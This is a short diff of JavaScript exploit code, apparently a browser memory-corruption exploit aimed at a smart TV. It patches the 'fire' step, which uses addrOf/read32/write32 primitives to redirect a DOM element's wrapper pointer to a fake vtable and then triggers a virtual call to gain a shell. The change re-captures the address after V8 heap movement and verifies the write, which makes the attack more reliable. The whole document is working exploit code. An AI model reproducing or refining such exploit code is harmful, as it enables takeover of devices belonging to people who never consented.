@@ -1105,7 +1105,17 @@ window.runPayload_fn = async function _pwn() {
   // ── DISPARO ── (secuencia ajustada: sin allocs entre addrOf(el)/cw/trigger)
   console.log("[!] FIRE: writing wrapper(div)+0x10 -> backing and triggering div.nodeName ...");
   _saveNow();
-  write32((elBase + WRAPPER_OBJ_OFS) >>> 0, backing);   // único cw a la TV
+  // The wrapper is a V8 heap object: a scavenge between the earlier addrOf(el)
+  // (before ~20 console lines) and this cw leaves a stale address, and the
+  // trigger silently returns 'DIV' (seen on hardware 2026-10-27).  Re-capture
+  // right before the write, verify the readback, and retry once fresh.
+  let fireBase = (addrOf(el) & ~1) >>> 0;
+  write32((fireBase + WRAPPER_OBJ_OFS) >>> 0, backing);   // único cw a la TV
+  if ((read32((fireBase + WRAPPER_OBJ_OFS) >>> 0) >>> 0) !== backing) {
+    console.log("[!] wrapper readback mismatch - recapturing (heap moved)");
+    fireBase = (addrOf(el) & ~1) >>> 0;
+    write32((fireBase + WRAPPER_OBJ_OFS) >>> 0, backing);
+  }
   // trigger: método virtual de Node sobre el div redirigido
   const r = el.nodeName;
   // si llegamos acá sin shell, el dispatch no pasó por nuestra vtable como esperábamos
